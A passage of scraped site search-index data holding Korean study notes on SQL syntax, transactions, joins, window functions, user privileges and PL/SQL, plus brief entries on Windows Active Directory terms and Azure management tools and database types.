확인(Oracle) exec sp_help ‘db0.테이블명’ --\u0026gt; (SQL Server) go    테이블 구조 변경(칼럼 추가, 삭제 등) DDL    ALTER TABLE 테이블명\n  ADD 칼럼명 데이터 유형;\n  DROP COLUMN 칼럼명;\n  MODIFY (칼럼명 데이터유형 DEFAULT식 NOT NULL); -\u0026gt; 칼럼 데이터 유형, 조건 등 변경 Oracle\n  ALTER (칼럼명 데이터유형 DEFAULT식 NOT NULL); -\u0026gt; SQL Server\n  RENAME COLUMN 변경전칼럼명 TO 뉴칼럼명; Ora\n  sp_rename 변경전칼럼명, 뉴칼럼명, ‘COLUMN’; SQ\n  DROP CONSTRAINT 조건명; 제약조건 삭제\n  ADD CONSTRAINT 조건명 조건 (칼럼명); 조건 추가\n  RENAME 변경전테이블명 TO 변경후테이블명; Ora\n  sp_rename ‘db0.TEAM’,‘TEAM_BACKUP’; SQL\n  DROP TABLE 테이블명 [CASCADE CONSTRAINT]\n  CASCADE CONSTRAINT : 참조되는 제약조건 삭제\n  TRUNCATE TABLE 테이블명: 행 제거, 저장공간 재사용\n     DML   DDL 명령어의 경우 실행시 AUTO COMMIT 하지만 DML의 경우 COMMIT을 입력해야 한다.      SQL Server의 경우 DML도 AUTO COMMIT\n  INSERT INTO PLAYER (PLAYER) VALUES (‘PJS’);\n  UPDATE PLAYER SET BACK_NO = 60;\n  DELETE FROM PLAYER;\n  SELECT PLAYER_ID FROM PLAYER;\n  SELECT DISTINCT POSITION 시 구분값만 출력 ex)GK, FW, DF, MF\n  SELECT PLAYER AS “선수명” FROM PLAYER;\n     와일드카드   * : 모든\n  % : 모든\n  - : 한 글자\n       합성 연산자   문자와 문자 연결 : ||(Oracle), + (SQL Server)\n  SELECT PLAYER_NAME + ‘선수’ “정보”\n       TCL    트랜잭션\n 밀접히 관련되어 분리될 수 없는 1개 이상의 DB 조작        COMMIT\n 올바르게 반영된 데이터를 DB에 반영        ROLLBACK\n 트랜잭션 시작 이전의 상태로 되돌림        SAVEPOINT\n 저장 지점       트랜잭션의 특성(ACID)   원자성(Atomicity)\n 트랜잭션에서 정의된 연산들은 모두 성공적으로 실행되던지 아니면 전혀 실행되지 않아야 함    일관성(Consistency)\n 트랜잭션 실행 전 DB 내용이 잘못 되지 않으면 실행 후도 잘못 되지 않아야 함    고립성(lsolation)\n 트랜잭션 실행 도중 다른 트랜잭션의 영향을 받아 잘못된 결과를 만들어서는 안된다.    지속성(Durability)\n 트랜잭션이 성공적으로 수행되면 DB의 내용은 영구적으로 저장된다.      SAVEPOINT SVPT1; (Oracle) ROLLBACK TO SVPT1; (Oracle) SAVE TRAN SVPT1; (SQL Server) ROLLBACK TRAN SVPT1; (SQL Server) COMMIT;    연산자의 종류    연산자 우선순위 : ()-\u0026gt;NOT-\u0026gt;비교연산자-\u0026gt;AND-\u0026gt;OR\n  BETWEEN a AND b : a와 b 값 사이에 있으면 됨\n  IN (list) : 리스트에 있는 값중 어느 하나라도 일치\n  LIKE ‘비교문자열’ : 비교문자열과 형태가 일치\n  IS NULL : NULL 값인 경우\n  NOT IN (list) : list의 값과 일치하지 않는다\n  IS NOT NULL : NULL 값을 갖지 않는다.\n      SELECT PLAYER_NAME 선수명\n  FROM PLAYER\n  WHERE TEAM_ID = ‘K2’; -\u0026gt; 팀ID가 K2인 사람\n  WHERE TEAM_ID IN (‘K2’,‘K7’); -\u0026gt; K2,K7인 사람\n  WHERE HEIGHT BETWEEN 170 AND 180; -\u0026gt; 키가 170 ~ 180인 사람\n  WHERE POSITION IS NULL; -\u0026gt; 포지션 없는 사람\n  NULL 값과의 수치연산은 NULL 값을 리턴한다.\n  NULL 값과의 비교연산은 거짓(FALSE)를 리턴한다.\n  ROWNUM : 원하는 만큼의 행을 가져올 때 사용(Or)\n  TOP : (SQL Server)\n  WHERE ROWNUM =1;\n  SELECT TOP(1) PLAYER_NAME FROM PLAYER;\n     함수의 종류   문자형 함수   LOWER : 문자열을 소문자로\n  UPPER : 문자열을 대문자로\n  ASCII : 문자의 ASCII 값 반환\n  CHR/CHAR : ASCII 값에 해당하는 문자 반환\n  CONCAT : 문자열1, 2를 연결\n  SUBSTR/SUBSTRING : 문자열 중 m 위치에서 n개의 문자 반환\n  LENGTH/LEN : 문자열 길이를 숫자 값으로 반환\n  CONCAT(‘RDBMS’,‘ SQL’) -\u0026gt; ‘RDBMS SQL’\n  SUBSTR(‘SQL Expert’,5,3) -\u0026gt; ‘Exp’\n  LTRIM(‘xxxYYZZxYZ’,‘x’) -\u0026gt; ‘YYZZxYZ’\n  RTRIM(‘XXYYzzXYzz’,‘z’) -\u0026gt; ‘XXYYzzXY’\n  TRIM(‘x’ FROM ‘xxYYZZxYZxx’) -\u0026gt; ‘YYZZxYZ’\n        숫자형 함수   SIGN(n) : 숫자가 양수면1 음수면-1 0이면 0 반환\n  MOD : 숫자1을 숫자2로 나누어 나머지 반환\n  CEIL/CEILING(n) : 크거나 같은 최소 정수 반환\n  FLOOR(n) : 작거나 같은 최대 정수 리턴\n  ROUND(38.5235,3) -\u0026gt; 38.524\n  ROUND(38.5235,1) -\u0026gt; 38.5\n  ROUND(38.5235) -\u0026gt; 39\n  TRUNC(38.5235,3) -\u0026gt; 38.523\n  TRUNC(38.5235,1) -\u0026gt; 38.5\n  TRUNC(38.5235) -\u0026gt; 38\n       날짜형 함수   SYSDATE/GETDATE() 현재날짜와 시각 출력\n  EXTRACT/DATEPART 날짜에서 데이터 출력\n  TO_NUMBER(TO_CHAR(d,‘YYYY’))/YEAR(d)\n    SELECT ENAME, CASE WHEN SAL \u0026gt;=3000 THEN ‘HIGH’ WHEN SAL \u0026gt;=1000 THEN ‘MID’ ELSE ‘LOW’ END AS SALARY_GRADE FROM EMP;    NULL 관련 함수   NVL(식1,식2)/ISNULL(식1,식2) : 식1의 값이 NULL 이면 식2 출력\n  NULLIF(식1,식2) : 식1이 식2와 같으면 NULL을 아니면 식1을 출력\n  COALESCE(식1,식2) : 임의의 개수표현식에서 NULL이 아닌 최초의 표현식, 모두 NULL이면 NULL 반환\n  ex)COALESCE(NULL,NULL,‘abc’) -\u0026gt; ‘abc’\n       집계 함수   여러 행들의 그룹이 모여서 그룹당 단 하나의 결과를 돌려주는 함수이다.\n  GROUP BY 절은 행들을 소그룹화 한다.\n  SELECT, HAVING, ORDER BY 절에 사용 가능\n  ALL : Default 옵션\n  DISTINCT : 같은 값을 하나의 데이터로 간주 옵션\n  COUNT(*) : NULL 포함 행의 수\n  COUNT(표현식) : NULL 제외 행의 수\n  SUM, AVG : NULL 제외 합계, 평균 연산\n  STDDEV : 표준 편차\n  VARIAN : 분산\n  MAX, MIN : 최대값, 최소값\n      GROUP BY, HAVING 절의 특징    GROUP BY 절을 통해 소그룹별 기준을 정한 후, SELECT 절에 집계 함수를 사용한다.\n  집계 함수의 통계 정보는 NULL 값을 가진 행을 제외하고 수행한다.\n  GROUP BY 절에서는 ALIAS 사용 불가\n  집계 함수는 WHERE 절에 올 수 없다.\n  HAVING 절에는 집계함수를 이용하여 조건 표시o\n  HAVING 절은 일반적으로 GROUP BY 뒤에 위치\n      SEARCHED_CASE_EXPRESSION\n CASE WHEN LOC = ‘a’ THEN ‘b’    SIMPLE_CASE_EXPRESSION\n CASE LOC WHEN ‘a’ THEN ‘b’    이 2문장은 같은 의미이다.\n     ORDER BY 특징    SQL 문장으로 조회된 데이터들을 다양한 목적에 맞게 특정한 칼럼을 기준으로 정렬하여 출력하는데 사용한다.\n  ORDER BY 절에 칼럼명 대신 ALIAS 명이나 칼럼 순서를 나타내는 정수도 사용 가능하다.\n  DEFAULT 값으로 오름차순(ASC)이 적용되며 DESC 옵션을 통해 내림차순으로 정렬이 가능하다.\n  SQL 문장의 제일 마지막에 위치한다.\n  SELECT 절에서 정의하지 않은 칼럼 사용 가능\n      Oracle에서는 NULL을 가장 큰 값으로 취급하며 SQL Server에서는 NULL을 가장 작은 값으로 취급한다.      SELECT 문장 실행 순서\n FROM -\u0026gt; WHERE -\u0026gt; GROUP BY -\u0026gt; HAVING -\u0026gt; SELECT -\u0026gt; ORDER BY    SELECT TOP(2) WITH TIES ENAME, SAL FROM EMP ORDER BY SAL DESC;  위는 급여가 높은 2명을 내림차순으로 출력하는데 같은 급여를 받는 사원은 같이 출력한다(WITH TIES)     JOIN    두 개 이상의 테이블들을 연결 또는 결합하여 데이터를 출력하는 것\n  일반적으로 행들은 PK나 FK 값의 연관에 의해 JOIN이 성립된다.\n  어떤 경우에는 PK, FK 관계가 없어도 논리적인 값들의 연관만으로 JOIN이 성립가능하다.\n  5가지 테이블을 JOIN 하기 위해서는 최소 4번의 JOIN 과정이 필요하다. (N-1)\n      EQUI JOIN\n 2 개의 테이블 간에 칼럼 값들이 서로 정확하게 일치하는 경우에 사용, 대부분 PK, FK의 관계를 기반으로 한다.    SELECT table1.column_name, table2.column_name FROM table1, table2 WHERE table1.column_name = table2.column_name; # 위 SQL처럼 컬럼명 앞에 테이블 명을 기술해줘야 함     NON EQUI JOIN\n  2개의 테이블 간에 칼럼 값들이 서로 정확하게 일치하지 않는 경우에 사용\n  ‘=’ 연산자가 아닌 BETWEEN, \u0026gt;, \u0026lt;= 등 연산자 사용\n    SELECT E.ENAME, E.JOB, E.SAL, S.GRADE FROM EMP E, SALGRADE S WHERE E.SAL BETWEEN S.LOSAL AND S.HSAL; # 위는 E의 SAL의 값을 S의 LOSAL과 HSAL 범위에서 찾는 것이다.    집합 연산자    두 개 이상의 테이블에서 조인을 사용하지 않고 연관된 데이터를 조회할 때 사용\n  SELECT 절의 칼럼 수가 동일하고 SELECT 절의 동일 위치에 존재하는 칼럼의 데이터 타입이 상호 호환할 때 사용 가능\n     일반 집합 연산자   UNION : 합집합(중복 행은 1개로 처리)\n  UNION ALL : 합집합(중복 행도 표시)\n  INTERSECT : 교집합(INTERSECTION)\n  EXCEPT,MINUS : 차집합(DIFFERENCE)\n  CROSS JOIN : 곱집합(PRODUCT)\n       순수 관계 연산자 : 관계형 DB를 새롭게 구현   SELECT -\u0026gt; WHERE\n  PROJECT -\u0026gt; SELECT\n  NATRUAL JOIN -\u0026gt; 다양한 JOIN\n  DIVIDE -\u0026gt; 사용x\n {a,x}{a,y}{a,z} divdie {x,z} = {a}         FROM 절 JOIN 형태     INNER JOIN\n JOIN 조건에서 동일한 값이 있는 행만 반환, USING이나 ON 절을 필수적으로 사용        NATURAL JOIN\n 두 테이블 간의 동일한 이름을 갖는 모든 칼럼들에 대해 EQUI JOIN 수행, NATURAL JOIN이 명시되면 추가로 USING, ON, WHERE 절에서 JOIN 조건을 정의할 수 없다, SQL Sever는 지원x        USING 조건절\n 같은 이름을 가진 칼럼들 중에서 원하는 칼럼에 대해서만 선택적으로 EQUI JOIN을 할 수 있다, JOIN 칼럼에 대해서 ALIAS나 테이블 이름과 같은 접두사를 붙일 수 없다, SQL Server 지원x        ON 조건절\n ON 조건절과 WHERE 조건절을 분리하여 이해가 쉬우며, 칼럼명이 다르더라도 JOIN 조건을 사용할 수 있는 장점이 있다, ALIAS나 테이블명 반드시 사용        CROSS JOIN\n 양쪽 집합의 M*N건의 데이터 조합이 발생한다.        OUTER JOIN\n JOIN 조건에서 동일한 값이 없는 행도 반환 가능하다, USING이나 ON 조건절 반드시 사용해야 함        LEFT OUTER JOIN\n 조인 수행시 먼저 표기된 좌측 테이블에 해당하는 데이터를 읽은 후, 나중 표기된 우측 테이블에서 JOIN 대상 데이터를 읽어 온다. 우측 값에서 같은 값이 없는 경우 NULL 값으로 채운다        LIGHT OUTER JOIN\n LEFT OUTER JOIN의 반대        FULL OUTER JOIN\n 조인 수행시 좌측, 우측 테이블의 모든 데이터를 읽어 JOIN하여 결과를 생성한다. 중복 데이터는 삭제한다.       계층형 질의   테이블에 계층형 데이터가 존재하는 경우 데이터를 조회하기 위해 사용     SATRT WITH : 계층 구조 전개의 시작 위치 지정\n  CONNECT BY : 다음에 전개될 자식 데이터 지정\n  PRIOR : CONNECT BY 절에 사용되며, 현재 읽은 칼럼을 지정한다. PRIOR 자식 = 부모 형태를 사용하면 계층구조에서 부모 데이터에서 자식 데이터(부모-\u0026gt;자식) 방향으로 전개하는 순방향 전개를 한다. 반대는 역방향 전개\n  NOCYCLE : 동일한 데이터가 전개되지 않음\n  ORDER SIBLINGS BY : 형제 노드간의 정렬 수행\n  WHERE : 모든 전개를 수행한 후에 지정된 조건을 만족하는 데이터만 추출한다.(필터링)\n  LEVEL : 루트 데이터이면 1, 그 하위 데이터면 2, 리프 데이터까지 1씩 증가\n  CONNECT_BY_ISLEAF : 해당 데이터가 리프 데이터면1, 그렇지 않으면 0\n  CONNECT_BY_ISCYCLE : 해당 데이터가 조상이면 1, 아니면 0 (CYCLE 옵션 사용했을 시만 사용 가능)\n  SYS_CONNECT_BY_PATH : 루트 데이터부터 현재 전개할 데이터까지의 경로를 표시한다.\n  CONNECT_BY_ROOT : 현재 전개할 데이터의 루트 데이터를 표시한다. 단항 연산자이다.\n  셀프 조인 : 동일 테이블 사이의 조인, FROM 절에 동일 테이블이 2번 이상 나타난다. 반드시 테이블 별칭을 사용해야 함\n  서브 쿼리 : 하나의 SQL문안에 포함되어 있는 또 다른 SQL문, 알려지지 않은 기준을 이용한 검색에 사용\n  서브 쿼리 사용시 주의 사항\n  서브쿼리를 괄호로 감싸서 사용한다.\n  서브쿼리는 단일 행 또는 복수 행 비교 연산자와 함께 사용 가능하다. 단일 행 비교 연산자는 서브쿼리의 결과가 반드시 1건 이하여야 하고 복수 행 비교 연산자는 결과 건수와 상관없다.\n  서브쿼리에서는 ORDER BY를 사용하지 못한다.\n  SELECT, FROM, WHERE, HAVING, ORDER BY, INSERT-VALUES, UPDATE-SET 절에 사용 가능\n       단일 행 비교 연산자 : =, \u0026lt;, \u0026gt;, \u0026lt;\u0026gt; 등\n  다중 행 비교 연산자 : IN, ALL, ANY, SOME 등\n  스칼라 서브쿼리 : 한 행, 한 칼럼만을 반환하는 서브쿼리\n  인라인 뷰 : 테이블 명이 올 수 있는 곳에 사용, ORDER BY 사용 가능\n     뷰    테이블은 실제로 데이터를 가지고 있는 반면, 뷰는 실제 데이터를 가지고 있지 않다. 가상 테이블이라고도 함\n  뷰 사용 장점\n  독립성 : 테이블 구조가 변경되어도 뷰를 사용하는 응용 플그램은 변경하지 않아도 된다.\n  편리성 : 복잡한 질의를 뷰로 생성함으로써 관련 질의를 단순하게 작성할 수 있다.\n  보안성 : 직원의 급여정보와 같이 숨기고 싶은 정보가 존재할 때 사용\n    CREATE VIEW V_PLAYER_TEAM AS DROP VIEW V_PLAYER_TEAM;     ROLLUP : Subtotal을 생성하기 위해 사용, Grouping Columns의 수를 N이라고 했을 때 N+1 Level의 Subtotal이 생성된다. 인수 순서에 주의\n  GROUPING : Subtotal의 total을 생성\n  CUBE : 결합 가능한 모든 값에 대하여 다차원 집계를 생성, ROLLUP에 비해 시스템에 부하 심함\n  GROUPING SETS : 인수들에 대한 개별 집계를 구할 수 있다, 다양한 소계 집합 생성 가능\n     윈도우 함수   행과 행간의 관계를 정의하거나 행과 행간을 비교, 연산하는 함수     RANK : 특정 항목에 대한 순위를 구하는 함수, 동일한 값에 대해서는 동일한 순위를 부여(1,2,2,4)\n  DENSE_RANK : 동일한 순위를 하나의 등수로 간주(1,2,2,3)\n  ROW_NUMBER : 동일한 값이라도 고유한 순위 부여\n  SUM : 파티션별 윈도우의 합 구할 수 있다.\n ex)같은 매니저를 두고 있는 사원들의 월급 합    MAX,MIN : 파티션별 윈도우의 최대,최소 값을 구할 수 있다.\n ex)같은 매니저를 두고 있는 사원들 중 최대 값    AVG : 원하는 조건에 맞는 데이터에 대한 통계 값\n ex)같은 매니저 내에서 앞의 사번과 뒤의 사번의 평균    ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING --\u0026gt; (현재 행을 기준으로 파티션 내에서 앞의 1건, 현재행, 뒤의 1건을 범위로 지정)   COUNT : 조건에 맞는 데이터에 대한 통계 값\n ex)본인의 급여보다 50 이하가 적거나 150 이하로 많은 급여를 받는 인원수    FIRST_VALUE : 파티션별 윈도우에서 가장 먼저 나온 값을 구한다.(SQL Server는 지원x)\n  LAST_VALUE : 파티션별 윈도우에서 가장 나중에 나온 값을 구한다.(SQL Server 지원x)\n  LAG : 파티션별 윈도우에서 이전 몇 번째 행의 값을 가져올 수 있다.(SQL Server 지원x)\n  LEAD : 파티션별 윈도우에서 이후 몇 번째 행의 값을 가져올 수 있다.(SQL Server 지원x)\n  RATIO_TO_REPORT : 파티션 내 전체 SUM값에 대한 행별 칼럼 값의 백분율을 소수점으로 구할 수 있다. 결과 값은 0보다 크고 1보다 작거나 같다.\n  PERCENT_RANK : 파티션별 윈도우에서 제일 먼저 나오는 것을 0, 제일 늦게 나오는 것을 1로 하여 행의 순서별 백분율을 구한다. 0\u0026gt;=,\u0026lt;=1\n  CUME_DIST : 현재 행보다 작거나 같은 건수에 대한 누적백분율을 구한다. \u0026gt;0, \u0026lt;=1\n  NTILE : 파티션별 전체 건수를 인수 값으로 N등분한 결과를 구할 수 있다.\n      DCL : 유저 생성하고 권한을 제어할 수 있는 명령어\n  Oracle과 SQL Server의 사용자 아키텍처 차이\n  Oracle : 유저를 통해 DB에 접속을 하는 형태, ID와 PW 방식으로 인스턴스에 접속을 하고 그에 해당하는 스키마에 오브젝트 생성 등의 권한을 부여받게 됨\n  SQL Server : 인스턴스에 접속하기 위해 로그인이라는 것을 생성하게 되며, 인스턴스 내에 존재하는 다수의 DB에 연결하여 작업하기 위해 유저를 생성한 후 로그인과 유저를 매핑해 주어야 한다. Windows 인증 방식과 혼합 모드 방식이 존재함\n  시스템 권한 : 사용자가 SQL 문을 실행하기 위해 필요한 적절한 권한\n  GRANT : 권한 부여\n  REVOKE : 권한 취소\n  GRANT CREATE USER TO SCOTT;\n  CONN SCOTT/TIGER(ID/PW)\n  CREATE USER PJS IDENTIFIED BY KOREA7;\n  GRANT CREATE SESSION TO PJS;\n  GRANT CREATE TABLE TO PJS;\n  REVOKE CREATE TABLE FROM PJS;\n  모든 유저는 각각 자신이 생성한 테이블 외에 다른 유저의 테이블에 접근하려면 해당 테이블에 대한 오브젝트 권한을 소유자로부터 부여받아야 한다.\n  ROLE : 유저에게 알맞은 권한들을 한 번에 부여하기 위해 사용하는 것\n  CREATE ROLE LOGIN_TABLE;\n  GRANT CREATE TABLE TO LOGIN_TABLE;\n  DROP USER PJS CASCADE;\n  CASCADE : 하위 오브젝트까지 삭제\n  절차형 SQL : SQL문의 연속적인 실행이나 조건에 따른 분기처리를 이용하여 특정 기능을 수행하는 저장 모듈을 생성할 수 있다, Procedure, User Defined Function, Trigger 등이 있음\n  저장 모듈 : PL/SQL 문장을 DB 서버에 저장하여 사용자와 애플리케이션 사이에서 공유할 수 있도록 만든 일종의 SQL 컴포넌트 프로그램, 독립적으로 실행되거나 다른 프로그램으로부터 실행될 수 있는 완전한 실행 프로그램\n      PL/SQL 특징\n  Block 구조로 되어있어 각 기능별로 모듈화 가능\n  변수, 상수 등을 선언하여 SQL 문장 간 값을 교환\n  IF, LOOP 등의 절차형 언어를 사용하여 절차적인 프로그램이 가능하도록 한다.\n  DBMS 정의 에러나 사용자 정의 에러를 정의하여 사용할 수 있다.\n  PL/SQL은 Oracle에 내장되어 있으므로 호환성 굳\n  응용 프로그램의 성능을 향상시킨다.\n  Block 단위로 처리 -\u0026gt; 통신량을 줄일 수 있다.\n    DECLARE : BEGIN~END 절에서 사용될 변수와 인수에 대한 정의 및 데이터 타입 선언부\n  BEGIN~END : 개발자가 처리하고자 하는 SQL문과 여러 가지 비교문, 제어문을 이용 필요한 로직 처리\n  EXCEPTION : BEGIN~END 절에서 실행되는 SQL문이 실행될 때 에러가 발생하면 그 에러를 어떻게 처리할지 정의하는 예외 처리부\n  CREATE Procedure Procedure_name\n  REPLACE Procedure Procedure_name\n  DROP Procedure Procedure_name\n  / \u0026lt;- 컴파일 하라는 명령어\n  T-SQL : 근본적으로 SQL Server를 제어하는 언어\n  CREATE Procedure schema_NAME.Procedure_name   Trigger   특정한 테이블에 INSERT, UPDATE, DELETE와 같은 DML문이 수행되었을 때, DB에서 자동으로 동작하도록 작성된 프로그램, 사용자 호출이 아닌 DB 자동 수행   CREATE Trigger Trigger_name   프로시저와 트리거의 차이점\n 프로시저는 BEGIN~END 절 내에 COMMIT, ROLLBACK과 같은 트랜잭션 종료 명령어 사용가능, DB 트리거는 BEGIN~END 절 내에 사용 불가       옵티마이저   사용자가 질의한 SQL문에 대해 최적의 실행 방법을 결정하는 역할 수행     규칙기반 옵티마이저\n 우선순위를 가지고 실행계획을 생성한다. 우선 순위가 높은 규칙이 적은 일량으로 해당 작업을 수행한다고 판단한다, 인덱스 유무와 SQL문에서 참조하는 객체등을 참고       비용기반 옵티마이저\n 현재 대부분의 DB에서 사용, SQL문을 처리하는데 필요한 비용이 가장 적은 실행계획을 선택하는 방식, 비용이란 SQL문을 처리하기 위해 예상되는 소요시간 또는 자원 사용량을 의미, 테이블,인덱스,칼럼 등 다양한 객체 통계정보와 시스템 통계정보 등을 이용한다.         실행계획\n SQL에서 요구한 사항을 처리하기 위한 절차와 방법을 의미, 실행계획을 구성하는 요소에는 조인 순서, 조인 기법, 액세스 기법, 최적화 정보, 연산 등이 있다.        인덱스\n 원하는 데이터를 쉽게 찾을 수 있도록 돕는 책의 찾아보기와 유사한 개념, 검색 성능의 최적화를 목적으로 두고 있지만 느려질 수 있다는 단점이 존재       B-TREE 인덱스에서 원하는 값을 찾는 과정   브랜치 블록의 가장 왼쪽 값이 찾고자 하는 값보다 작거나 같으면 왼쪽 포인터로 이동\n  찾고자 하는 값이 브랜치 블록의 값 사이에 존재하면 가운데 포인터로 이동\n  오른쪽에 있는 값보다 크면 오른쪽 포인터로 이동\n        전체 테이블 스캔 : 테이블에 존재하는 모든 데이터를 읽어 가면서 조건에 맞으면 결과로서 추출하고 조건에 맞지 않으면 버리는 방식으로 검색\n  전체 테이블 스캔을 하는 경우\n  SQL문에 조건이 존재하지 않는 경우\n  SQL문의 주어진 조건에 사용 가능한 인덱스가 존재하지 않는 경우\n  옵티마이저의 취사 선택\n  병렬처리 방식으로 처리하는 경우 등\n        인덱스 스캔 : 인덱스를 구성하는 칼럼의 값을 기반으로 데이터를 추출하는 액세스 기법\n  인덱스 유일 스캔 : 유일 인덱스를 사용하여 단 하나의 데이터를 추출하는 방식(중복X, 구성 칼럼에 대해 모두 ‘=’ 로 값이 주어진 경우에만 가능)\n  인덱스 범위 스캔 : 인덱스를 이용하여 한 건 이상의 데이터를 추출하는 방식\n  인덱스 역순 범위 스캔 : 인덱스의 리프 블록의 양방향 링크를 이용하여 내림차순으로 데이터를 읽는다\n     NL Join : 프로그래밍에서 사용하는 중첩된 반복문과 유사한 방식으로 조인을 수행, 랜덤 액세스 방식으로 데이터를 읽는다. Sort Merge Join : 조인 칼럼을 기준으로 데이터를 정렬하여 조인을 수행, 스캔 방식으로 데이터 읽음. Hash Join : CPU 작업 위주로 처리, 해슁 기법 이용, NL Join의 랜덤 액세스 문제와 SMJ의 정렬 작업 부담을 해결하기 위한 대안으로 등장    "}),a.add({id:167,href:'/docs/system/window/window13/',title:"Active Directory",content:"Windows Active Directory   Windows Active Directory    일반적인 회사의 네트워크 상황을 Windows Server에서 구현하기 위한한 기술입니다.\n  네트워크 상으로 나누어져 있는 여러 자원을 중앙의 관리자가 통합하여 관리함으로써, 본사 및 지사의 직원들은 자신의 PC에 몯느 정보를 보관할 필요가 없어집니다.\n  한 PC에서 관리하는 만큼 타 지사에 출장을 가서도 자신의 아이디로 로그인만 하면 타인의 PC가 자신의 PC 환경과 동일하게 변경되어집니다.\n  PC가 있는 장소와 무관하게 회사의 어디서든지 회사 전체 자원을 편리하게 이용하기 위해 사용되어집니다.\n     Active Directory 용어    Directory Service\n 분산된 네트워크 관련 자원 정보를 중앙의 저장소에 통합시켜 놓은 환경으로, 즉 사용자는 중앙의 저장소를 통해서 원하는 네트워크 자원에 대한 정보를 자동으로 취득하여 그 자원에 접근할 수 있게 됩니다.       Active Directory(AD)\n Diretory Service를 Windows Server에서 구현한 서비스입니다.       Active Directory 도메인 서비스 (Active Directory Domain Service, AD DS)\n 컴퓨터, 사용자, 기타 주변 장치에 대한 정보를 네트워크 상에 저장하고 이러한 정보들을 관리자가 통합하여 관리하도록 하는 서비스입니다.       도메인\n AD의 가징 기본이 되는 단위로 서울 본사, 부산 지사 등이 각각 하나의 도메인을 의미       트리와 포리스트\n 트리는 도메인의 집합, 포리스트는 두 개 이상의 트리로 구성       사이트\n 도메인이 논리적 범주라면, 사이트는 물리적인 범주로 사이트는 지리적으로 떨어져 있으며, IP 주소대가 다른 묶음 정도를 의미       트러스트\n 도메인 또는 포레스트 사이에 신뢰할지 여부에 대한 관계를 나타내는 의미라 사용       조직 구성 단위(Organizational Unit, OU)\n 한 도메인 안에서 세부적인 단위로 나누는 것       도메인 컨트롤러(Domain Controller, DC)\n 로그인, 이용 권한 확인, 새로운 사용자 등록, 암호 변경 그룹 등을 처리한느기능을 하는 서버 도메인       읽기 전용 도메인 컨트롤러(Read Only Dmain Controller, RODC)\n 주 도메인 컨트롤러부터 데이터를 전송받아서 저장한 후 사용하지만 스스로 데이터를 추가하거나 변경하지는 않음       글로벌 카탈로그(Global Catalog, 약자로 GC)\n 트러스트 내의 도메인들에 포함딘 개체에 대한 정보를 수집하여 저장되는 통합 저장소                                                                                  #\n"}),a.add({id:168,href:'/docs/azure/azuretraining/azure02/',title:"Az-900 : 관리옵션",content:"Azure 관리옵션   Azure 관리옵션의 다양한 종류    Azure의 관리는 다양한 도구 및 플랫폼을 사용하여 Azure을 구성하고 관리할 수 있습니다.\n  명령줄, 언어별 SDK, 개발자 도구, 마이그레이션 도구 등에 제공되는 여러 도구가 있습니다.\n  하단은 가장 일상적으로 사용되는 관리 및 조작에 주로 사용되는 도구들입니다.\n  Azure Portal : GUI를 통해 Azure 조작\n  Azure PowerShell 및 Azure CLI : 명령줄 및 자동화 기반으로 Azure 조작\n  Azure Cloud Shell : 웹 기반 명령줄 인터페이스\n  모바일 디바이스에서 리소스를 모니터링하고 관리하기 위한 Azure 모바일 앱\n       Azure Portal    Azure Portal은 몯느 웹 브라우저를 통해 엑세스할 수 있는 공용 웹 사이트로, Azure 계정으로 로그인하여 Azure의 서비스를 사용, 관리 및 모니터링이 가능합니다.     Azure PowerShell    Azure PowerShell은 Windows,Linux 또는 macOS에서 실행되는 PowerShell의 플랫폼 간 버전인 Windows PowerShell또는 PowerShell Core를 설치할 수 있는 모듈입니다.\n  Azure PowerShell 명령어를 통해 Azure 서비스를 사용, 관리하는 것이 가능합니다.\n  New-AzVM ` -ResourceGroupName \u0026#34;MyResourceGroup\u0026#34; ` -Name \u0026#34;TestVm\u0026#34; ` -Image \u0026#34;UbuntuLTS\u0026#34; ` ...    Azure CLI   Azure CLI는 Azure에 연결하고 Azure 리소스에서 관리 명령을 실행하는 플랫폼 간 명령줄 프로그램입니다. 플랫폼 간이란 Windows, Linux 또는 macOS에서 실행합니다.  az vm create \\ --resource-group MyResourceGroup \\ --name TestVm \\ --image UbuntuLTS \\ --generate-ssh-keys \\ ...    Azure Cloud Shell     Azure Cloud Shell은 Azure 리소스를 관리하기 위한 인증된 대화형 셸로, 브라우저에서 엑세스할 수 있습니다.\n  기본적으로는 Azure CLI로 설정되어 있지만 pwsh를 통해 PowerShell Core로 전환이 가능합니다. 또한 owerShell 환경에는 두 CLI 도구가 사전 설치되어 있으며 여러 도구의 사용 또한 가능합니다.\n     개발자 도구\n  .NET Core\n  Python\n  Java\n  Node.js\n    편집기\n  코드(Cloud Shell 편집기)\n  vim\n  nano\n  emacs\n    기타 도구\n  git\n  maven\n  make\n  npm\n       Azure 모바일 앱    Microsoft Azure 모바일 앱을 사용하면 iOS나 Android 휴대폰 또는 태블릿에서 모든 Azure 계정과 리소스를 액세스, 관리 및 모니터링할 수 있습니다. 설치되면 다음 작업을 수행할 수 있습니다.    "}),a.add({id:169,href:'/docs/azure/microsoftazure/azure10/',title:"Azure DataBase",content:"Azure DataBase     Azure DataBase는 기존 스토리지 문제를 해결하기 위해 클라우드에 데이터를 저장하는 것을 고려합니다.\n  하지만 보안, 백업 및 재해 복구에 대한 우려가 존재합니다.\n  Azure에서는 다양한 형식과 볼륨의 데이터를 저장하도록 여러 데이터베이스 서비스를 제공합니다.\n     Azure Database의 특징    Azure Database의 이점\n  자동화된 백업 및 복구\n  전 세계에서 복제\n  데이터 분석 지원\n  암호화 기능\n  다양한 데이터 형식\n  가상 디스크의 데이터 스토리지\n  스토리지 계층\n    데이터 형식\n 정형 데이터 (Structured data)   정형 데이터는 스키마를 준수하는 데이터이므로 모든 데이터에 동일한 필드 또는 속성이 존재합니다.\n  정형 데이터는 테이블의 한 행을 다른 테이블의 또 다른 행에 있는 데이터와 연결하는 방법을 나타내며, 이를 관계형 데이터라고도 합니다.\n       반정형 데이터 (Semi-structured data)   반정형 데이터는 테이블, 행, 열에 제약받지 않으며, 대신 태그 혹은 키 값을 사용합니다.\n  반정형 데이터는 비관계형 데이터 혹은 NoSQL이라고도 합니다.\n       비정형 데이터 (Unstructured data)   비정형 데이터는 지정된 구조가 없는 데이터를 포괄합니다.\n  데이터의 종류에 대한 제한이 없다는 것은 PDF, JPG, JSON와 같은 형식을 모두 포함하고 있습니다.\n       스토리지 서비스 암호화   Azure는 암호화 및 복제 기능을 통해 봉나 및 고가용성을 데이터에 제공합니다.\n  미사용 데이터에 대한 Azure SSE (스토리지 서비스 암호화)를 사용하면 조직의 보안 및 규정준수를 충족하도록 데이터를 보호할 수 있습니다.\n  클라이언트 쪽의 암호화를 통해 클라이언트 라이브러이에 데이턱 